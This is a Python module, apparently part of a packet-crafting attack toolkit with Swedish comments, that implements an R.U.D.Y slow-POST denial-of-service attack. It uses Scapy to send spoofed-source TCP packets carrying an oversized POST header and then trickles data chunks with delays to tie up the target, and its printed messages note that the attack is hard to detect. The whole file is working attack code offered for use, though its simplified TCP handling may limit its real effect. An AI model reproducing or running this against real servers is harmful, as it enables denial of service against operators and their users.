rudy_attack.py ====================
"""
R.U.D.Y (R-U-Dead-Yet) Attack
Slow HTTP POST attack
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class RUDYAttack(BaseAttack):
    """R.U.D.Y - Slow HTTP POST attack"""

    def get_attack_name(self):
        return "R.U.D.Y Attack"

    def execute(self, count=50, delay=0.5):
        """
        Kör R.U.D.Y attack
        count: Antal POST-connections
        delay: Fördröjning mellan varje byte i POST body
        """
        self.print_header("R.U.D.Y Attack (Slow POST)", port=80, count=count)

        print("[*] R.U.D.Y - R-U-Dead-Yet Slow POST attack")
        print(f"[*] Skickar POST data extremt långsamt (delay: {delay}s)")
        print("[*] Håller connections öppna under lång tid")

        self.start_time = time.time()
        self.packets_sent = 0

        # Skapa POST-connections
        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()

            # Content-Length är stor men vi skickar långsamt
            content_length = 1000000  # 1 MB

            # Initial POST request
            post_header = f"""POST /upload HTTP/1.1
Host: {self.target_ip}
Content-Length: {content_length}
Content-Type: application/x-www-form-urlencoded
User-Agent: {self.custom_message}-RUDY
X-RUDY-ID: {i}

""".replace('\n', '\r\n').encode()

            packet = IP(src=fake_source, dst=self.target_ip) / \
                     TCP(sport=fake_sport, dport=80, flags="PA", seq=random.randint(1000, 9000)) / \
                     Raw(load=post_header)

            self.send_packet(packet)

            # Skicka POST data byte-för-byte (simulerat med små chunks)
            for j in range(5):  # 5 små chunks istället för 1M bytes
                tiny_data = f"{self.custom_message}_RUDY_DATA_{i}_{j}\n".encode()

                data_packet = IP(src=fake_source, dst=self.target_ip) / \
                              TCP(sport=fake_sport, dport=80, flags="PA", seq=random.randint(1000, 9000)) / \
                              Raw(load=tiny_data)

                self.send_packet(data_packet)
                time.sleep(delay)

            if (i + 1) % 10 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] R.U.D.Y: {i + 1}/{count} POST connections ({pps:.1f} pps)")

        self.log_attack("RUDY_ATTACK",
                        f"{count} slow POST connections, message: {self.custom_message}")
        self.print_summary()

        print("\n[!] Varje connection håller server upptagen under lång tid")
        print("[!] Svår att detektera - ser ut som långsam klient")
